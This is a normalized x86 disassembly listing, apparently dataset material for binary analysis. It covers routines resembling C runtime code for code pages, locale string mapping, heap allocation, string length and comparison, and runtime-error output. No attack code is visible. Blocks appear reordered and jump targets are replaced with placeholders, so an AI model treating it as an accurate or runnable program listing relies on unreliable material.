movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_40c896
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_40c91a
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40e940
xor edx edx
inc edx
add esp 0xc
cmp [ ebp - 0x18 ] edx
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_40c896
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_40cd9b
push 0x14
push r--data
call sub_40c69c
or [ ebp - 0x20 ] 0xffffffff
call sub_40bf4b
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_40caa4
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_40cb48
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_40c208
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_40c6e1
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_40cbc2
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_40d694
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40ba40
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_40ba40
pop ecx
push 0xd
call sub_40e8d6
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40cefc
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_40ba40
pop ecx
sub_40cf53
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xbc ]
xor ebp ebp
cmp eax ebp
push edi
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebp
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebp
je r-xdata
push 0x6
lea edi [ esi + 0x50 ]
pop ebx
cmp [ eax + 0xb4 ] ebp
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_40ba40
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_40ba40
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_40ba40
push [ esi + 0xc0 ]
call sub_40ba40
add esp 0x10
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x4 ] ebp
je r-xdata
mov eax [ edi ]
cmp eax ebp
je r-xdata
push eax
call sub_410073
push [ edi ]
call sub_40ba40
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebp
je r-xdata
add edi 0x10
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebp
je r-xdata
cmp [ eax ] ebp
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_40ba40
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_40ba40
pop ecx
push [ esi + 0xb0 ]
call sub_40ba40
push [ esi + 0xbc ]
call sub_40ba40
pop ecx
pop ecx
cmp [ eax ] ebp
jne r-xdata
push eax
call sub_40ba40
push [ esi + 0xbc ]
call sub_410243
pop ecx
pop ecx
push eax
call sub_40ba40
pop ecx
push eax
call sub_40ba40
push [ esi + 0xbc ]
call sub_410203
pop ecx
pop ecx
sub_40d093
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ InterlockedIncrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
call edi
sub_40d119
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
retn
push ebx
push ebp
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
push eax
call edi
push 0x6
lea ebx [ esi + 0x50 ]
pop ebp
push eax
call edi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
add eax 0xb4
push eax
call edi
pop edi
pop ebp
pop ebx
push eax
call edi
sub_40d1a5
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_40d093
test esi esi
pop ecx
je r-xdata
push esi
call sub_40d119
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_40cf53
pop ecx
sub_40d1e3
push 0xc
push r--data
call sub_40c69c
call sub_40bf4b
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_40e8d6
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_40d1a5
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d24d
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_40bf4b
mov esi [ eax + 0x6c ]
mov eax esi
call sub_40c6e1
retn
push 0x20
call sub_40c37e
pop ecx
sub_40d274
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov esi ecx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_410480
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40fd18
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_4104c7
add esp 0x18
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40ba40
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_40ba40
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_40d259
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
cmp ecx ebx
mov [ ebp - 0x8 ] ecx
je r-xdata
push eax
call sub_40d9e0
cmp eax ebx
pop ecx
je r-xdata
call sub_410680
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_40e940
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_4104c7
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_40d9e0
cmp eax ebx
pop ecx
je r-xdata
call sub_410680
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_40d259
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_40d259
pop ecx
cmp [ ebp + 0x1c ] ebx
push ebx
push ebx
jne r-xdata
push eax
call sub_40d9e0
cmp eax ebx
pop ecx
je r-xdata
call sub_410680
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_40d616
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40b00b
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40d274
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40d659
mov eax [ esp + 0x4 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
retn
push 0xd
pop eax
retn
sub_40d6a7
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40b00b
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40d6dd
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_40b00b
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40d6a7
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_410033
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40d793
push 0xc
push r--data
call sub_40c69c
push 0xe
call sub_40e8d6
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d7fa
call sub_40c6e1
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_40ba40
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_40ba40
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_40d810
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40d8e4
push 0x8
push r--data
call sub_40c69c
push [ rw-data ]
call sub_40bd2f
pop ecx
test eax eax
je r-xdata
jmp sub_40d898
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_40d92c
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
je r-xdata
call sub_40d694
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_40d694
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40f5bf
add esp 0x14
mov eax esi
jmp r-xdata
sub_40d991
push 0xc
push r--data
call sub_40c69c
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_40c6e1
retn
push 0x4
call sub_40e8d6
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40f1d6
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d9d7
sub_40d9e0
push ebp
mov ebp [ esp + 0x8 ]
cmp ebp 0xffffffe0
ja r-xdata
push ebp
call sub_40e911
pop ecx
call sub_40d694
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
push ebx
mov ebx [ HeapAlloc@IAT ]
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_40dd26
push 0x1e
call sub_40db86
push 0xff
call sub_40c3c8
cmp eax 0x3
jne r-xdata
cmp ebp esi
je r-xdata
cmp ebp esi
jne r-xdata
push ebp
call sub_40d991
cmp eax esi
pop ecx
jne r-xdata
xor eax eax
inc eax
mov eax ebp
jmp r-xdata
add edi 0xf
and edi 0xfffffff0
push edi
xor edi edi
inc edi
mov esi eax
test esi esi
jne r-xdata
push esi
push [ rw-data ]
call ebx
push eax
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] eax
push 0xc
pop edi
je r-xdata
call sub_40d694
mov [ eax ] edi
push ebp
call sub_40e911
test eax eax
pop ecx
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
mov edi ebp
jne r-xdata
jmp r-xdata
call sub_40d694
mov [ eax ] edi
sub_40dab0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40db3b
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_40d898
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_40db86
push ecx
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
xor esi esi
xor edi edi
cmp edi 0x17
jae r-xdata
inc edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
push ebp
push 0x3
call sub_41095c
cmp eax 0x1
pop ecx
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebp eax
cmp ebp esi
je r-xdata
push 0x3
call sub_41095c
test eax eax
pop ecx
jne r-xdata
pop ebp
cmp ebp 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_40dab0
pop ecx
push eax
push [ esi ]
push ebp
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov ebp rw-data
push ebp
call sub_40d92c
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40f4c3
add esp 0x14
push esi
call sub_40dab0
inc eax
cmp eax 0x3c
pop ecx
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_40d92c
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_40dab0
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_410386
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40f4c3
add esp 0x14
push [ edi * 8 + rw-data ]
push ebx
push ebp
call sub_4102cc
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40f4c3
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_40f4c3
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push ebp
call sub_41079f
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40f4c3
add esp 0x14
push r--data
push ebx
push ebp
call sub_4102cc
add esp 0xc
test eax eax
je r-xdata
sub_40dd26
push 0x3
call sub_41095c
cmp eax 0x1
pop ecx
je r-xdata
push 0xfc
call sub_40db86
push 0xff
call sub_40db86
pop ecx
pop ecx
push 0x3
call sub_41095c
test eax eax
pop ecx
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40dd5f
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_40bed4
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
cmp eax 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
